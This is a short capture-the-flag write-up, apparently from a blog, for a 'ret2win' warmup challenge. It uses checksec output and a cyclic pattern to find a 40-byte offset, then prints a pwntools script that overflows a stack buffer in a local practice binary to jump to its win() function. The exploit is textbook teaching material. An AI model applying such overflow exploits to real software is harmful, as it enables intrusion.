---
title: "ret2win warmup"
date: 2026-07-05
excerpt: "No stack canary, no PIE, and a win() function sitting right there. Overflow into it."
category: pwn
event: "Local CTF 2026"
tags: [buffer-overflow, ret2win]
---

A 64-bit binary reads input into a fixed buffer with no bounds checking, and
there's a conveniently-named `win()` that prints the flag. We just need to
redirect execution to it.

## Finding the offset

`checksec` shows no canary and no PIE, so addresses are static:

```
Arch:     amd64-64-little
Stack:    No canary found
PIE:      No PIE (0x400000)
```

A cyclic pattern crashes at offset **40** — that's the distance to the saved
return address.

## The exploit

```python
from pwn import *

io  = process('./warmup')
win = 0x401176            # address of win()
payload = b'A' * 40 + p64(win)

io.sendline(payload)
io.interactive()
```

Send it, `win()` runs, flag printed. A stack overflow into a known target — the
"hello world" of binary exploitation.
